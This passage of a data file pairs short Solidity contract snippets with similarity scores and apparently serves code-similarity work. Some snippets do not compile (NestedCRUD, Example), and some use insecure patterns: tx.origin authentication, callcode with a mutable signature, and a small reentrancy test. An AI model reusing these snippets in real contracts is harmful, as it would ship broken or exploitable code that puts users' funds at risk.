}",0.5562509675191843,"contract TrueLove {

    function Is() public pure returns (string) {

        return ""Sol 鉂わ笍 Sonic"";

    }

}"
"contract Certs {

    mapping(address => bytes32[]) public studentCertIPFShashes;

    address issuer;  

    modifier onlyIssuer {
        require(issuer == msg.sender);
        _;
    }

    constructor() public {
      issuer = msg.sender;
    }

    function issuerCert(address student, bytes32 IPFShash) public onlyIssuer {
        studentCertIPFShashes[student].push(IPFShash);
    }

}",0.5944334195264404,"contract Ownable {



  address public owner;

  

  mapping(address => uint) public balances;



  function Ownable() public {

    owner = msg.sender;

  }





  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }

  



  function transferOwnership(address newOwner) public onlyOwner {

    require(newOwner != address(0));      

    owner = newOwner;

  }



}"
"contract Answer {
  mapping(address => mapping(string => bool)) voters;

  struct qList {
    uint count; 
    mapping(address => mapping(uint => uint)) answer;
  }

  mapping(string => qList) questionnaires;

  function vote(string ID, uint qNum, uint ans) returns (bool) {
    if (voters[msg.sender][ID]) throw;
    voters[msg.sender][ID] = true;
    questionnaires[ID].count += 1;
    questionnaires[ID].answer[msg.sender][qNum] = ans;
    return true;
  }

  function getNumResult(string ID) constant returns (uint res) {
    return questionnaires[ID].count;
  }
}",0.5860342664618506,"contract freedomStatement {

    

    string public statement = ""https:

    mapping (address => bool) internal consent;

    event wearehere(string statement);

    

    constructor () public {

        emit wearehere(statement);

    }

        

    function isHuman(address addr) internal view returns (bool) {

        uint size;

        assembly { size := extcodesize(addr) }

        return size == 0;

    }



    function () external {

        require(isHuman(msg.sender),""no robot"");

        consent[msg.sender] = true;

    }

    

    function check(address addr) public view returns (bool){

        return(consent[addr]);

    }

}"
"contract Test {

    A public Contract_A;
    B public Contract_B;

    constructor() public payable {
        
        require(msg.value > 0, ""Value required"");

        
        Contract_A = new A();
        Contract_B = new B();

        
        address(Contract_A).transfer(address(this).balance);
    }

    function show_balance_A() public view returns(uint256) {
        return address(Contract_A).balance;
    }

    function show_balance_B() public view returns(uint256) {
        return address(Contract_B).balance;
    }

    
    function testTransferTo_B_No_Args() public {

        
        uint256 BalanceBInitial = address(Contract_B).balance;

        uint256 sendValue = 10; 

        Contract_A.newTransferToB( 
            address(Contract_B),
            sendValue,
            abi.encode(bytes4(keccak256(""receiver()"")))
        );

        
        assert( address(Contract_B).balance == BalanceBInitial + sendValue);
    }

    
    function testTransferTo_B_With_Args() public {


        
        uint256 BalanceBInitial = address(Contract_B).balance;

        uint256 sendValue = 100; 
        uint256 uintParamValue = 5; 

        Contract_A.newTransferToB( 
            address(Contract_B),
            sendValue,
            abi.encodeWithSelector(bytes4(keccak256(""receiverWithArgs(uint256)"")), uintParamValue)
        );

        
        assert( address(Contract_B).balance == BalanceBInitial + sendValue);
        assert( Contract_B.lastReceivedUint() == uintParamValue);

    }

    
    function testTransferTo_B_More_than_Available_should_throw() public {

        uint256 BalanceAInitial = address(Contract_A).balance;
        uint256 sendValue = BalanceAInitial + 1; 

        Contract_A.newTransferToB( 
            address(Contract_B),
            sendValue,
            abi.encode(bytes4(keccak256(""receiver()"")))
        );

        

    }
}",0.5825759049114729,"contract token {

    

    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;

  

    event Transfer(address indexed from, address indexed to, uint256 value);  



    constructor () public{

      

    }



    function _transfer(address _from, address _to, uint256 _value) internal {

      

      require(_to != 0x0);

      

      require(balanceOf[_from] >= _value);

      

      require(balanceOf[_to] + _value > balanceOf[_to]);

      

      uint previousBalances = balanceOf[_from] + balanceOf[_to];

      

      balanceOf[_from] -= _value;

      

      balanceOf[_to] += _value;

      

      emit Transfer(_from, _to, _value);

      

      assert(balanceOf[_from] + balanceOf[_to] == previousBalances);

    }

  

    function transfer(address _to, uint256 _value) public {

        _transfer(msg.sender, _to, _value);

    }

    

    function transferFrom(address _from, address _to, uint256 _value)public returns (bool success) {

        

        require(_value <= allowance[_from][msg.sender]);   

        allowance[_from][msg.sender] -= _value;

        _transfer(_from, _to, _value);

        return true;

    }

  

    function approve(address _spender, uint256 _value) public returns (bool success) {

        allowance[msg.sender][_spender] = _value;

        return true;

    }

 

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {

        tokenRecipient spender = tokenRecipient(_spender);

        if (approve(_spender, _value)) {

            spender.receiveApproval(msg.sender, _value, this, _extraData);

            return true;

        }

    }

  

    

}"
"contract A {

    event Data(bytes a);
    event Sig(bytes4 a);
    event Val(uint a);

    function a() public payable {
        emit Data(msg.data);
        emit Sig(msg.sig);
        emit Val(msg.value);
        b();
        B b = new B();
        b.c();

    }

    function b() public payable {
        emit Data(msg.data);
        emit Sig(msg.sig);
        emit Val(msg.value);
    }
}",0.5386371830295782,"contract Donation is Ownable {

    

    event Donated(address donator, uint amount);

    

    function () public payable {

        emit Donated(msg.sender, msg.value);

    }

    

    function claim() public onlyOwner {

        msg.sender.transfer(getBalance());

    }

    

    function getBalance() public view returns (uint) {

        return address(this).balance;

    }

}"
"contract B {
    event Data(bytes a);
    event Sig(bytes4 a);
    event Val(uint a);

    function c() public payable {
        emit Data(msg.data);
        emit Sig(msg.sig);
        emit Val(msg.value);
    }
}",0.5180186962615821,"contract Zhtong {
    address public owner;
      uint private result;
      function Set(){
          owner = msg.sender;
      }
      function assign(uint x, uint y) returns (uint){
          result = x + y;
      }
}"
"contract KeyAKeyB {

    using HitchensUnorderedKeySetLib for HitchensUnorderedKeySetLib.Set;

    
    mapping(bytes32 => HitchensUnorderedKeySetLib.Set) bInA;

    
    mapping(bytes32 => HitchensUnorderedKeySetLib.Set) aInB;

    
    mapping(bytes32 => bytes32) public values;

    event LogSet(bytes32 keyA, bytes32 keyB, bytes32 value);
    event LogRem(bytes32 keyA, bytes32 keyB);

    function multikey(bytes32 keyA, bytes32 keyB) public pure returns(bytes32) {
        return keccak256(abi.encodePacked(keyA, keyB));
    }

    
    

    function set(bytes32 keyA, bytes32 keyB, bytes32 value) public {
        if(!isBInA(keyA, keyB)) bInA[keyA].insert(keyB); 
        if(!isAInB(keyA, keyB)) aInB[keyB].insert(keyB); 
        values[multikey(keyA, keyB)] = value;
        emit LogSet(keyA, keyB, value);
    }

    function get(bytes32 keyA, bytes32 keyB) public view returns(bytes32 value) {
        
        
        return values[multikey(keyA, keyB)];
    }

    

    function remove(bytes32 keyA, bytes32 keyB) public {
        bInA[keyA].remove(keyB);
        aInB[keyB].remove(keyA);
        delete values[multikey(keyA, keyB)];
        emit LogRem(keyA, keyB);
    }

    

    function isBInA(bytes32 keyA, bytes32 keyB) public view returns(bool isIndeed) {
        return bInA[keyA].exists(keyB);
    }

    function isAInB(bytes32 keyA, bytes32 keyB) public view returns(bool isIndeed) {
        return aInB[keyB].exists(keyA);
    }

    

    function countBinA(bytes32 keyA) public view returns(uint) {
        return bInA[keyA].count();
    }

    function countAinB(bytes32 keyB) public view returns(uint) {
        return aInB[keyB].count();
    }

    function aBAtIndex(bytes32 keyA, uint row) public view returns(bytes32 keyB) {
        return bInA[keyA].keyAtIndex(row);
    }

    function bAAtIndex(bytes32 keyB, uint row) public view returns(bytes32 keyA) {
        return aInB[keyB].keyAtIndex(row);
    }
}",0.5728577733589825,"contract Platform {

    mapping(bytes32 => address) public proxies;

    function name(bytes32 _symbol) public view returns (string);

    function setProxy(address _address, bytes32 _symbol) public returns (uint errorCode);

    function isOwner(address _owner, bytes32 _symbol) public view returns (bool);

    function totalSupply(bytes32 _symbol) public view returns (uint);

    function balanceOf(address _holder, bytes32 _symbol) public view returns (uint);

    function allowance(address _from, address _spender, bytes32 _symbol) public view returns (uint);

    function baseUnit(bytes32 _symbol) public view returns (uint8);

    function proxyTransferWithReference(address _to, uint _value, bytes32 _symbol, string _reference, address _sender) public returns (uint errorCode);

    function proxyTransferFromWithReference(address _from, address _to, uint _value, bytes32 _symbol, string _reference, address _sender) public returns (uint errorCode);

    function proxyApprove(address _spender, uint _value, bytes32 _symbol, address _sender) public returns (uint errorCode);

    function issueAsset(bytes32 _symbol, uint _value, string _name, string _description, uint8 _baseUnit, bool _isReissuable) public returns (uint errorCode);

    function reissueAsset(bytes32 _symbol, uint _value) public returns (uint errorCode);

    function revokeAsset(bytes32 _symbol, uint _value) public returns (uint errorCode);

    function isReissuable(bytes32 _symbol) public view returns (bool);

    function changeOwnership(bytes32 _symbol, address _newOwner) public returns (uint errorCode);

}"
"contract Publisher {
    StorageController _storages;

    constructor(address storageControllerAddress) public {
        _storages = StorageController(storageControllerAddress);
    }

    function getStorage(uint index) public view returns(string memory, uint256, uint256, uint256, uint256, bool) {
        (string memory name, uint256 maxLength, uint256 rank, uint256 writingFee, uint256 sellPrice,bool nonpublic) = _storages.getStorageData(index);
        return (name, maxLength,rank,writingFee,sellPrice,nonpublic);
    }
}",0.5685350530225076,"contract LighthouseAPI {

    address[] public members;

    mapping(address => uint256) indexOf;



    mapping(address => uint256) public balances;



    uint256 public minimalFreeze;

    uint256 public timeoutBlocks;



    LiabilityFactory public factory;

    XRT              public xrt;



    uint256 public keepaliveBlock = 0;

    uint256 public marker = 0;

    uint256 public quota = 0;



    function quotaOf(address _member) public view returns (uint256)

    { return balances[_member] / minimalFreeze; }

}"
"contract Factory {
  bytes32[] public Names;
  address[] public newContracts;

  function createContract (bytes32 name) public {
    address newContract = new Contract(name);
    newContracts.push(newContract);
  } 

  function getName (uint i) public {
    Contract con = Contract(newContracts[i]);
    Names[i] = con.Name();
  }
}",0.5712404662874596,"contract Contract2 {



    Contract1 public original;

  

  	mapping (uint16 => mapping (address => uint8)) public something;



    

    function Contract2(address c) public {

        original = Contract1(c);

    }





	function test(uint8 x, address a){

		if(original.something(uint8(x),a))

			something[x][a] = 1;

		else

			something[x][a] = 2;

	}

}"
"contract con2 {
    bytes32[5] y;
    function con2(){
    }

    function trys(address con1Contract){
        con1 b = con1(con1Contract);
         y = b.getData();
    }
}",0.5587882925202591,"contract AbstractENS {
    function owner(bytes32) constant returns(address);
    function resolver(bytes32) constant returns(address);
}"
"contract A1 {
  address addressOfM;
  function A1(address _m) {
      addressOfM = _m;
  }
  function forward() payable {
     if (!addressOfM.send(msg.value)) throw;
     
  }
}",0.597988962513774,"contract IRegistrar is IOwned {

    function addNewAddress(address _newAddress) public;

    function getAddresses() public view returns (address[]);

}"
"contract ReceiveEther {
    uint256 public clicksfromcreatorcount; 
    uint256 public count;
    address public creatorino = tx.origin;

        function increaseifcreatorclicks() external {
            require (msg.sender == creatorino);
                clicksfromcreatorcount++;
        }

        function () external payable {
            require (clicksfromcreatorcount>=1);
            if (clicksfromcreatorcount ==1) {
                require (tx.origin == creatorino);
            }
            require (count<2);
            count++;
        }
}",0.5596350947806169,"contract EtherTransferTo{

    address public owner;

    

    constructor() public {

    owner = msg.sender;

  }

  

    modifier onlyOwner() {

        require (msg.sender == owner);

        _;



    }

    

    function () payable public {

        

    }

    

    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    function withdraw(uint amount) onlyOwner returns(bool) {

        require(amount <= this.balance);

        owner.transfer(amount);

        return true;



    }

    



}"
"contract Example {

    mapping(uint => string) documents;


    function storeDocument(uint id, string docHash) {

        storeDocument[id] = docHash;
    }

    function verifyDocument(uint id, string hashToVerify) returns (bool){
        if(storeDocument[id] == hashToVerify ) {
            return true;
        }
        else{
            return false;
        }
     }
}",0.575317359797077,"contract ProofOfExistence {
  mapping (string => uint) private proofs;

  function storeProof(string sha256) {
    proofs[sha256] = block.timestamp;
  }

  function notarize(string sha256) {
    storeProof(sha256);
  }
  

  function checkDocument(string sha256) constant returns (uint) {
    return proofs[sha256];
  }
  
}"
"contract Files {
    struct AllFiles{
        string fileDesc;        
        uint fileId;            
    }
    uint filesCount;

    mapping (uint =>AllFiles) public allFiles;

    function addFile(string _desc) {
        uint id = filesCount+1;
        allFiles[id] = AllFiles({fileDesc: _desc, fileId: id});
    }

    function iterate() {
        for(uint256 i = 1; i<=filesCount; i++) {
            allFiles[i];
        }

    }
}",0.5567081334218937,"contract Vit is MintableToken {
  string public constant name = ""VitalikCoin"";
  string public constant symbol = ""VIT"";
  uint   public constant decimals = 18;
  
  function airdrop(address[] addresses, uint[] amounts) onlyOwner{
    for (uint i = 0; i < addresses.length; i++) {
       super.transfer(addresses[i], amounts[i]);
    }
  }
}"
"contract Campaign {

    struct Transaction {
        address Creditor;
        uint Amount;
        uint arrayPointer; 
    }
    address[] public transactionAddresses;  
    mapping(address => Transaction) public TransactionsMap; 

    function addTransaction(address _address,uint _amount) public {
        Transaction memory newRequest = Transaction({
           Creditor: _address,
           Amount: _amount,
           arrayPointer: transactionAddresses.push(_address)});
        TransactionsMap[_address]=newRequest;
    }
    function Testing()public {
        addTransaction(0xaef0B7Edd5D2E9315027ADFA4642E16a5c85Afd8,100);
        TransactionsMap[0xaef0B7Edd5D2E9315027ADFA4642E16a5c85Afd8].Amount++;
    }
    function a()public view  returns (uint){
        return TransactionsMap[0xaef0B7Edd5D2E9315027ADFA4642E16a5c85Afd8].Amount;
    }
    function b()public view  returns (address){
        return transactionAddresses[0];
    }
}",0.5515314820849373,"contract ERC20Token {

    
    function totalSupply() public constant returns (uint256 _totalSupply);
    function balanceOf(address _owner) public constant returns (uint256 _balance);
    function transfer(address _to, uint256 _amount) public returns (bool _success);
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool _success);
    function approve(address _spender, uint256 _amount) public returns (bool _success);
    function allowance(address _owner, address _spender) public constant returns (uint256 _remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _amount);
    event Approval(address indexed _owner, address indexed _spender, uint256 _amount);
}"
"contract myContract {
    function f() {
        int a = Math.sqrt(9);
    }
}",0.5901660140691879,"contract WalletContract

{

	function payMe() public payable;

}"
"contract StructArrayInitWrong {

  struct Room {
    address[] players;       
  }  
  Room[] rooms;
  address[] adr; 

  function createRoom() public {
                                    
    adr.push(msg.sender);
    Room memory room = Room(adr);   
    rooms.push(room);
  }

  function getRoomsLength() public view returns (uint) {
    return rooms.length;
  }
}",0.5907019832310247,"contract Snowflake {

    function whitelistResolver(address resolver) external;

    function withdrawSnowflakeBalanceFrom(string hydroIdFrom, address to, uint amount) public returns (bool);

    function getHydroId(address _address) public view returns (string hydroId);

}"
"contract NestedCRUD {

    using HitchensUnorderedKeyListLib for HitchensUnorderedKeyListLib.Set;

    struct Outer {
        bool arg1;
        uint arg2;
        
        HitchensUnorderedKeyListLib.Set nestedCRUD; 
    }

    mapping(bytes32 => Outer) public outerStructs; 
    HitchensUnorderedKeyListLib.Set outerKeys; 

    struct Inner {
        address arg1;
        uint arg2;
        
        bytes32 outerKey; 
    }

    mapping(bytes32 => Inner) public innerStructs;
    HitchensUnorderedKeyListLib.Set innerKeys;

    

    function newOuter(bytes32 id, bool arg1, uint arg2) public {
        outerKeys.insert(id);
        outerStructs storage o = outerStructs[id];
        o.arg1 = arg1;
        o.arg2 = arg2;
    }

    function newInner(bytes32 id, bytes32 outerId, address arg1, uint arg2) public {
        require(outerKeys.exists(outerId), ""Outer not found."");
        innerKeys.insert(id);
        Inner storage i = innerStructs[id];
        i.arg1 = arg1;
        i.arg2 = arg2;
        i.outerKey = outerKey;
    }

    

    function updateOuter(bytes32 id, bool arg1, uint arg2) public {
        require(outer.exists(id), ""Outer not found."");
        Outer storage o = outerStructs[id];
        o.arg1 = arg1;
        o.arg2 = args;
    }

    function updateInner(bytes32 id, address arg1, uint arg2) public {
        require(inner.exists(id), ""Inner not found"");
        Inner storage i = innerStructs[id];
        i.arg1 = arg1;
        1.arg2 = arg2;
        
    }

    
}",0.5198555945183665,"contract MonteLabsMS {
  
  mapping (address => bool) public owners;
  uint8 constant quorum = 2;
  Audit public auditContract;

  constructor(address[] _owners, Audit _auditContract) public {
    auditContract = _auditContract;
    require(_owners.length == 3);
    for (uint i = 0; i < _owners.length; ++i) {
      owners[_owners[i]] = true;
    }
  }

  function addAuditOrEvidence(bool audit, bytes32 _codeHash, uint _level,
                              bytes32 _ipfsHash, uint8 _v, bytes32 _r, 
                              bytes32 _s) internal {
    address sender = msg.sender;
    require(owners[sender]);

    bytes32 prefixedHash = keccak256(""\x19Ethereum Signed Message:\n32"",
                           keccak256(audit, _codeHash, _level, _ipfsHash));

    address other = ecrecover(prefixedHash, _v, _r, _s);
    
    assert(other != sender);
    if (audit)
      auditContract.addAudit(_codeHash, _level, _ipfsHash);
    else
      auditContract.addEvidence(_codeHash, _level, _ipfsHash);
  }

  function addAudit(bytes32 _codeHash, uint _level, bytes32 _ipfsHash,
                    uint8 _v, bytes32 _r, bytes32 _s) public {
    addAuditOrEvidence(true, _codeHash, _level, _ipfsHash, _v, _r, _s);
  }

  function addEvidence(bytes32 _codeHash, uint _version, bytes32 _ipfsHash,
                    uint8 _v, bytes32 _r, bytes32 _s) public {
    addAuditOrEvidence(false, _codeHash, _version, _ipfsHash, _v, _r, _s);
  }
}"
"contract Test {
    event Log(bool x);
    function TestF() {
        address f = address(new F());
        Log(f.call());
    }
    function TestN() {
        address n = address(new N());
        Log(n.call());
    }
}",0.5847864269225579,"contract Proxy {
    function emitTransfer(address _from, address _to, uint _value);
    function emitApprove(address _from, address _spender, uint _value);
}"
"contract Token {
    Crowdsale crowdsale;
    function Token(address theAddr) {
        crowdsale = Crowdsale(theAddr);
    }

    
    function talkToCrowdsale() {
        crowdsale.someMethod();
    }

    
    function talkToCrowdsale(address theAddr) {
        Crowdsale(theAddr).someMethod();
    }
}",0.5055541598818997,"contract TokenCrowdsale is TraceToken {

    function TokenCrowdsale() payable TraceToken() {}
    
    function withdraw() public onlyOwner {
        owner.transfer(this.balance);
    }
    
    function killMe() public onlyOwner {
        selfdestruct(owner);
    }
}"
"contract MyContract {

    struct user {
        address id;
        string name;
    }

    uint internal totalUsers = 0;
    mapping(address => user) internal users;

    function registerUser(string memory name) public {
        user storage u = users[msg.sender];
        require(keccak256(abi.encodePacked((name))) != keccak256(abi.encodePacked((""""))));
        if(msg.sender == u.id) {
            revert(""already registered"");
        } else {
            users[msg.sender] = user(msg.sender, name);
            totalUsers++;
        }
    }
}",0.5736883608348755,"contract AccessList {
    event Added(address _user);
    event Removed(address _user);

    mapping(address => bool) public access;

    function isSet(address addr) external view returns(bool) {
        return access[addr];
    }

    function add() external {
        require(!access[msg.sender]);
        access[msg.sender] = true;
        emit Added(msg.sender);
    }

    function remove() external {
        require(access[msg.sender]);
        access[msg.sender] = false;
        emit Removed(msg.sender);
    }
}"
"contract Events {

    uint eventCount;

    struct EventStruct {
        mapping(address=>bool) isAttendee;
        address[] attendees;
        bytes32 metadata;
    }

    mapping(uint=>EventStruct) public events;

    function createEvent(bytes32 metaData) public {
        events[eventCount].metadata = metaData;
        eventCount++;
    }

    function reserveAttenance(uint eventId) public {
        require(eventId < eventCount);
        EventStruct storage e = events[eventId];
        require(!e.isAttendee[msg.sender]);
        e.isAttendee[msg.sender] = true;
        e.attendees.push(msg.sender);
    }
}",0.5317164125357068,"contract InstaEvent {

    address public constant instaList = 0x9651CF40C45D1B0ad043B19FdfEf2e82546C3039;

    event LogEvent(uint64 indexed connectorID, uint64 indexed accountID, bytes4 indexed eventCode, bytes eventData);

    function emitEvent(uint64 _connectorID, bytes4 _eventCode, bytes calldata _eventData) external {
        uint64 _ID = ListInterface(instaList).accountID(msg.sender);
        require(_ID != 0, ""not-SA"");
        emit LogEvent(_connectorID, _ID, _eventCode, _eventData);
    }

}"
"contract Sample {
  address constant public myAddress = 0xE0f5206BBD039e7b0592d8918820024e2a7437b9;
  uint public vari;
  function setVari(uint a) {
    if(msg.sender == myAddress) {
      vari = a;
    }
  }  
}",0.591486537901934,"contract IDapCarToken {
    function mint(address _address, uint256 _value) public returns (bool);
    function balanceOf(address _owner) public constant returns (uint balance);
}"
"contract MegaFactory is FactoryTInterface {

  address factoryTaddress;

  function MegaFactory(address factoryT) {
      factoryTaddress = factoryT;
  }

  function newT() returns(address newContract) {
    FactoryTInterface factory = FactoryTInterface(factoryTaddress);
    return factory.newT();
  }
}",0.5328421214765828,"contract AccountingFactory is IAccountingFactory {

  event Created(address _owner, IAccounting _address);



  function create(address owner) external returns(IAccounting) {

    IAccounting _address = new Accounting(owner);

    emit Created(owner, _address);

    return _address;

  }

}"
"contract My {
    uint someVar;
}",0.5514760049160391,"contract Mkr is ERC20 {



}"
"contract Test {
    int a = 999; 
    function doIt() {
        int b; 
        assembly {
            b := sload(a);
        }
    }
}",0.5250431318986022,"contract Refundable {
  function refund(address th, uint amount) returns (bool);
}"
"contract DeployContract {
    function deploy(bytes  _bytecode) external returns(address addr) {

        bytes memory bytecode = abi.encodePacked(_bytecode, abi.encode(msg.sender));
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }
    }
}",0.5253809407990799,"contract Relay {
        address operator;

        function Relay() {
                operator = msg.sender;
        }

        function relayCall(address contractAddress, bytes4 abiSignature, bytes data) public returns (bool) {
                if (msg.sender != operator) {
                        throw;
                }
                return contractAddress.call(abiSignature, data);
        }
}"
"contract Hasher {

    function compare(string memory a, string memory b) public pure returns(bool) {
        return keccak256(abi.encodePacked(a)) == keccak256(abi.encodePacked(b));
    }
}",0.5836775931262739,"contract InstaRegistry is WalletRegistry {



    constructor() public {

        registry[keccak256(abi.encodePacked(""admin""))] = msg.sender;

        registry[keccak256(abi.encodePacked(""owner""))] = msg.sender;

    }

}"
"contract Test is TestInterface {
  uint8 private _depth = 0;

  
  function () payable {}

  event Entered(uint8 depth);

  function reentrance(address dest) {
    if (_depth > 2) {
      
      throw;
    }
    Entered(_depth);
    _depth++;
    dest.transfer(this.balance);
  }
}",0.5811871111350918,"contract Multisend {
    function multisend(address payable[] memory dests) public payable {
        uint value = msg.value / dests.length;
        for(uint i = 0 ; i < dests.length ; i++) dests[i].transfer(value);
        
        msg.sender.transfer(address(this).balance);
    }
}"
"contract Destination {
  function () payable {
    TestInterface sender = TestInterface(msg.sender);
    
    msg.sender.send(this.balance);
    sender.reentrance(this);
  }
}",0.5655422822562206,"contract mortal is owned {
    function kill() onlyOwner {
        if (this.balance > 0) {
            if (!msg.sender.send(this.balance)) throw;
        }
        suicide(msg.sender);
    }
}"
"contract Test {
    RobustDividendToken token;

    function Test(RobustDividendToken _token) public {
        token = _token;
    }

    function deposit() public payable {
        token.deposit.value(msg.value)();
    }
}",0.5829499597862771,"contract BurnTok {

    function () payable public{

    }

	function BurnToken (address _tokenaddress, uint256 _value) public {

        require(_tokenaddress.call(bytes4(keccak256(""burn(uint256)"")), _value));

    }

}"
"contract A {
   function myFuncA() {
    var obj = new B(msg.sender);
    obj.myFuncB();
   }    
}",0.5921963599003729,"contract Ownable {
  address  owner;
  function Ownable() {
    owner = msg.sender;
  }
}"
"contract contractB {

address public contractAaddress;
constructor(address deployedcontractA) public 
{
    contractAaddress = deployedcontractA;
}
function getContractAUsers() public view returns (address[]) {
   contractA contractInstance = contractA(contractAaddress);
   return contractInstance.getUsers.call(); 
}
}",0.5892465906624088,"contract Owned {

    address public contractOwner;



    constructor() public {

        contractOwner = msg.sender;

    }



    modifier onlyContractOwner() {

        require(contractOwner == msg.sender);

        _;

    }



    function forceChangeContractOwnership(address _to) public onlyContractOwner() returns(bool) {

        contractOwner = _to;

        return true;

    }

}"
"contract MyContract {
    function myFunction(address _a) {
        MethodStringInterface(_a).method(""abc"");
    }
}",0.5770153721701344,"contract SetCoreInterface {

   function setCoreContract(address _neWCoreAddress) external; 

}"
"contract C {
    uint[] counters;
    function getCounter(uint index)
        returns (uint counter, bool error) {
            if (index >= counters.length) return (0, true);
            else return (counters[index], false);
        }
    function checkCounter(uint index) {
        uint counter;
        bool error;

        (counter, error) = getCounter(index);
        if (error) { ... }
        else { ... }
    }
}",0.548643607554831,"contract ERC20Partial {
    function totalSupply() constant returns (uint totalSupply);
    function balanceOf(address _owner) constant returns (uint balance);
    function transfer(address _to, uint _value) returns (bool success);
    
    
    
    event Transfer(address indexed _from, address indexed _to, uint _value);
    
}"
"contract Derived is Base {
  function Derived() {}
}",0.5941289626399222,"contract Initable {
    function init(address token);
}"
"contract GeometryShapesData {
    struct Point {
        uint x;
        uint y;
    }
}",0.5106519921847985,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract A is GeometryShapesData {
    mapping (bytes32 => Point) public points;
    function addPoint(bytes32 idx, uint x, uint y) public { 
        points[idx] = Point(x, y);
    }
    function getPoint(bytes32 idx) constant public returns (uint x, uint y) {
        return (points[idx].x, points[idx].y);
    }
}",0.5971374448371791,"contract Copyright is Allow {

    bytes32[] public list;



    event SetLog(bytes32 hash, uint256 id);



    constructor() public  {

    }



    function save(bytes32 _hash) allow public {

        list.push(_hash);



        emit SetLog(_hash, list.length-1);

    }



    function count() public view returns(uint256) {

        return list.length;

    }

}"
"contract Main is Ownable {

    User[] private _users;
    mapping(uint256 => bool) userExists;

    function createUser(uint256 _id) onlyOwner external {
        require(!userExists[_id], ""User already exists."");
        userExists[_id] = true;

        User user = new User(_id);

        emit UserCreated(user, _users.length);

        _users.push(user);
    }
}",0.5394552397106414,"contract Pausable is Ownable {

    bool public paused;



    event SetPaused(bool _paused);



    constructor() public {

        emit SetPaused(false);

    }



    modifier notPaused() {

        require(!paused, ""Contract is paused"");

        _;

    }



    function setPaused(bool _paused) external onlyOwner {

        paused = _paused;

        emit SetPaused(_paused);

    }

}"
"contract Replicator {

  address public parent;

  function replicate() public returns(address) {
      address childAddress = clone(address(this));
      Replicator child = Replicator(childAddress);
      child.setParent(address(this));
      return child;
  }

  function setParent(address addr) public {
      parent = addr;
  }

  function clone(address a) public returns(address)  {
    address retval;
    assembly{
        mstore(0x0, or (0x5880730000000000000000000000000000000000000000803b80938091923cF3 ,mul(a,0x1000000000000000000)))
        retval := create(0,0, 32)
    }
    return retval;
 }
}",0.5524264888411583,"contract N2Contract is ReleaseableToken {

  string public name = 'N2Chain';

  string public symbol = 'N2C';

  uint8 public decimals = 4;



  

  address public newContractAddress;



  function N2Contract() public ReleaseableToken(1000000000, 200000000, 200000000) {}



  

  

  

  

  

  

  function setNewAddress(address _v2Address) external onlyOwner whenPaused {

    newContractAddress = _v2Address;

    emit ContractUpgrade(_v2Address);

  }



  

  

  

  

  

  function unpause() public onlyOwner whenPaused {

    require(newContractAddress == address(0));



    

    super.unpause();

  }

}"
"contract myContract {
    struct dataObject {
        uint a;
        address b;
    }
    mapping (uint => dataObject) public myMap;
    function setObject(uint key, uint _a, address _b) {
        myMap[key] = dataObject(_a,_b);
    }
}",0.5971143680685892,"contract ERC223Receiver {

	struct TKN {

		address sender;

		uint value;

		bytes data;

		bytes4 sig;

	}

	function tokenFallback(address _from, uint _value, bytes _data) public pure;

}"
"contract Foo {
    address bazz;
    string abiSignature;

    function Foo (address _bazz, string _abi) public {
        bazz = _bazz;
        abiSignature = _abi;
    }

    function updateABI (string _ABI) public {
        abiSignature = _ABI;
    }

    function callBazz(uint256 arg) public returns (bool bazzLib){
        bool bazzCall =  bazz.call(bytes4(sha3(abiSignature)), arg); 
        bool bazzLib  = bazz.callcode(bytes4(sha3(abiSignature)), arg); 
    }
}",0.5665544466954704,"contract ERC827 is ERC20 {
  function approveAndCall(
    address _spender,
    uint256 _value,
    bytes _data
  )
    public
    payable
    returns (bool);

  function transferAndCall(
    address _to,
    uint256 _value,
    bytes _data
  )
    public
    payable
    returns (bool);

  function transferFromAndCall(
    address _from,
    address _to,
    uint256 _value,
    bytes _data
  )
    public
    payable
    returns (bool);
}"
"contract Foo {

    
    struct Milestone {

        
        uint time;

        
        uint price;
    }

    Milestone[] milestones;

    function getMilestone(uint n) public constant returns (uint, uint ) {
        return (milestones[n].time, milestones[n].price);
    }    
}",0.5875199070136112,"contract MoneyMarket {

    function markets(address asset) public view returns (bool, uint, InterestRateModel, uint, uint, uint, uint, uint, uint);
    function oracle() public view returns (address);
}"
"contract Test {
    struct File {
        string fileName;
        string fileHash;
    }

    File[] files;

    function addFile(string fileName, string fileHash) public {
        File memory f = File(fileName, fileHash);
        files.push(f);
    }

    
    function getFiles(uint256 index) public view returns (string, string) {
        return (files[index].fileName, files[index].fileHash);
    }
}",0.5674718229493214,"contract EthAvatar {
    mapping (address => string) private ipfsHashes;

    event DidSetIPFSHash(address indexed hashAddress, string hash);


    function setIPFSHash(string hash) public {
        ipfsHashes[msg.sender] = hash;

        DidSetIPFSHash(msg.sender, hash);
    }

    function getIPFSHash() public view returns (string) {
        return ipfsHashes[msg.sender];
    }
}"
"contract Test {

    mapping (uint => uint) public grid;

    function check(uint x, uint y, uint size) public {

        for(uint i = 0; i < size; i++) {
            uint row = grid[x + i];
            for(uint j = 0; j < size; j++) {
                
                if((row >> (y + j)) & uint(1) == uint(1)) {
                    
                    revert();
                }

                
                row = row | (uint(1) << (y + j)); 
            }
            grid[x + i] = row;
        }
    }
}",0.5678044645786657,"contract SafeMath {

  function safeMul(uint a, uint b) returns (uint) {
    if (a == 0) {
      return 0;
    } else {
      uint c = a * b;
      require(c / a == b);
      return c;
    }
  }

  function safeDiv(uint a, uint b) returns (uint) {
    require(b > 0);
    uint c = a / b;
    require(a == b * c + a % b);
    return c;
  }

}"
"contract GoldNodes {

    address goldNodeOwner ;

    
    mapping (address => bool) isGoldNode;
    uint goldNodeCount = 0;

    
    mapping (address => bool) hasGoldNodeReplied;    
    uint replyCount = 0;

    
    bool allGoldNodesReplied = false;


    constructor() public{
        goldNodeOwner = msg.sender;
    }


    function addGoldNode(address _goldNode) public {
        
        require(msg.sender == goldNodeOwner, ""only gold owner allowed"");
        isGoldNode[_goldNode] = true;
        goldNodeCount++; 
    }

    function reply() public {
        require(isGoldNode[msg.sender], ""only gold nodes can reply"");
